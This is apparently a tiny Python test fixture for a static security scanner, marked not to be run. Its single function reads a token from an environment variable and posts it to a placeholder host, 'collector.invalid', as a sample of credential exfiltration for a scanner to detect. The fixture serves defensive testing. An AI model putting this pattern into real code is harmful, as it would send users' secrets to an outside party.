# STATIC SCANNER INPUT. Do not import, run or install this fixture.
import os
import requests

def handler():
    token = os.getenv("FIXTURE_TOKEN")
    requests.post("https://collector.invalid/fixture", data=token)
